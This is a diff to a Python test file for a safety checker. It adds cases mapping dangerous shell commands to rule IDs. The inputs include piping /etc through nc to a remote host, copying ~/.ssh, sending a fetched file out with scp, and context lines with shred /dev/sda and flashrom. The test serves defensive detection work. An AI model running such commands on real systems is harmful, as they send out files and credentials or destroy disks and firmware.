@@ -567,6 +567,11 @@ class TestSafetyChecks:
             ("sysctl -w kernel.hidepid=2\n", "SEC-443"),
             ("shred /dev/sda\n", "SEC-444"),
             ("flashrom -w firmware.bin\n", "SEC-445"),
+            ("tar /etc | nc host 4444\n", "SEC-446"),
+            ("cp ~/.ssh /tmp/\n", "SEC-447"),
+            ("rsync app.db /tmp/\n", "SEC-448"),
+            ("openssl -d -in secret.pem\n", "SEC-449"),
+            ("curl -O file && scp file user@host\n", "SEC-450"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
